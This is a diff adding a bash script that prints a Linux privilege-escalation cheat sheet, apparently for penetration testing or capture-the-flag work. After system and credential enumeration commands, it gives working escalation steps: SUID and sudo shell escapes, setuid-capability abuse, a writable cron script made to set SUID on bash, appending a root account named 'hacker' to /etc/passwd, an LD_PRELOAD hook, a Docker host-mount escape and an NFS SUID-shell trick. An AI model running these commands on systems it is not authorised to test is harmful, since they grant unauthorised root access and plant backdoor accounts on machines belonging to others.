@@ -1,0 +1,98 @@
+#!/bin/bash
+BOLD='\033[1m'
+CYAN='\033[36m'
+GREEN='\033[32m'
+YELLOW='\033[33m'
+BLUE='\033[34m'
+NC='\033[0m'
+
+printf "\n"
+echo -e "${BOLD}${YELLOW}── PRIVILEGE ESCALATION — LINUX ──────────────────────${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Enumeration ──────────────────────────────────────${NC}"
+echo -e "  ${GREEN}id && whoami${NC}"
+echo -e "  ${GREEN}cat /etc/passwd; ls /home${NC}"
+echo -e "  ${GREEN}hostname; uname -a; cat /etc/os-release${NC}"
+echo -e "  ${GREEN}ps aux; ip a s; route; netstat -tlpn; ss -anp${NC}"
+echo -e "  ${GREEN}ls -lah /etc/cron*; crontab -l; sudo crontab -l${NC}"
+echo -e "  ${GREEN}find / -writable -type d 2>/dev/null${NC}"
+echo -e "  ${GREEN}find / -perm -u=s -type f 2>/dev/null${NC}           # SUID"
+echo -e "  ${GREEN}/usr/sbin/getcap -r / 2>/dev/null${NC}                # capabilities"
+echo -e "  ${GREEN}cat /etc/fstab; mount; lsblk; lsmod${NC}"
+echo -e "  ${GREEN}dpkg -l${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Quick Checklist ──────────────────────────────────${NC}"
+echo -e "  ${GREEN}sudo -l${NC}                                          # sudo rules"
+echo -e "  ${GREEN}history${NC}"
+echo -e "  ${GREEN}env; cat ~/.bashrc${NC}"
+echo -e "  ${GREEN}find / -name 'config.php' 2>/dev/null${NC}"
+echo -e "  ${GREEN}find / -name '*.conf' -path '*/apache*' 2>/dev/null${NC}"
+echo -e "  ${GREEN}watch -n 1 'ps -aux | grep <process>'${NC}           # watch processes"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Automated Tools ──────────────────────────────────${NC}"
+echo -e "  ${GREEN}./linpeas.sh${NC}"
+echo -e "  ${GREEN}./unix-privesc-check${NC}"
+echo -e "  ${GREEN}./lse.sh${NC}"
+echo -e "  ${GREEN}pspy64${NC}                                           # monitor processes without root"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── SUID GTFOBins ────────────────────────────────────${NC}"
+echo -e "  ${GREEN}find / -perm -u=s -type f 2>/dev/null${NC}           # find SUID"
+printf "\n"
+echo -e "  Note: GTFOBins examples:"
+echo -e "  ${GREEN}find . -exec /bin/sh -p \\; -quit${NC}                # find SUID"
+echo -e "  ${GREEN}vim -c ':!/bin/sh'${NC}                               # vim SUID"
+echo -e "  ${GREEN}python3 -c 'import os; os.execl(\"/bin/sh\", \"sh\", \"-p\")'${NC}  # python SUID"
+echo -e "  ${GREEN}awk 'BEGIN {system(\"/bin/sh\")}'${NC}                  # awk SUID"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── sudo GTFOBins ────────────────────────────────────${NC}"
+echo -e "  ${GREEN}sudo find . -exec /bin/sh \\; -quit${NC}"
+echo -e "  ${GREEN}sudo vim -c ':!/bin/bash'${NC}"
+echo -e "  ${GREEN}sudo python3 -c 'import os; os.system(\"/bin/bash\")'${NC}"
+echo -e "  ${GREEN}sudo less /etc/passwd${NC}                            # then: !/bin/bash"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Capabilities Abuse ───────────────────────────────${NC}"
+echo -e "  ${GREEN}/usr/sbin/getcap -r / 2>/dev/null${NC}"
+printf "\n"
+echo -e "  Note: cap_setuid+ep example:"
+echo -e "  ${GREEN}python3 -c 'import os; os.setuid(0); os.system(\"/bin/bash\")'${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Cron Job Abuse ───────────────────────────────────${NC}"
+echo -e "  ${GREEN}cat /etc/cron* /var/spool/cron/* 2>/dev/null${NC}"
+echo -e "  ${GREEN}echo 'chmod +s /bin/bash' >> /path/to/writable/cron/script.sh${NC}  # if script writable"
+printf "\n"
+echo -e "  Note: PATH hijack: create malicious binary earlier in PATH"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Writable /etc/passwd ─────────────────────────────${NC}"
+echo -e "  ${GREEN}openssl passwd -1 -salt salt1 hackerpass${NC}         # generate hash"
+echo -e "  ${GREEN}echo 'hacker:\$1\$salt1\$HASH:0:0:root:/root:/bin/bash' >> /etc/passwd${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── LD_PRELOAD Hook ──────────────────────────────────${NC}"
+echo -e "  Note: hook.c: __attribute__((constructor)) void init() { ... shellcode ... }"
+echo -e "  ${GREEN}gcc -Wall -fPIC -z execstack -c -o hook.o hook.c${NC}"
+echo -e "  ${GREEN}gcc -shared -o hook.so hook.o -ldl${NC}"
+echo -e "  ${GREEN}export LD_PRELOAD=/path/hook.so${NC}"
+echo -e "  ${GREEN}sudo <any_binary>${NC}"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── Docker Escape ────────────────────────────────────${NC}"
+echo -e "  ${GREEN}docker run -it --rm -v /:/mnt alpine chroot /mnt${NC}  # if in docker group"
+printf "\n"
+
+echo -e "${BOLD}${CYAN}── NFS no_root_squash ───────────────────────────────${NC}"
+echo -e "  ${GREEN}showmount -e <TARGET>${NC}"
+echo -e "  ${GREEN}sudo mount -t nfs <TARGET>:/share /tmp/nfsmount${NC}"
+echo -e "  ${GREEN}cp /bin/bash /tmp/nfsmount/bash; chmod +s /tmp/nfsmount/bash${NC}"
+echo -e "  ${GREEN}/tmp/nfsmount/bash -p${NC}                            # on target"
+printf "\n"
+
+printf "\n"
+echo -e "${YELLOW}─────────────────────────────────────────────────────${NC}"
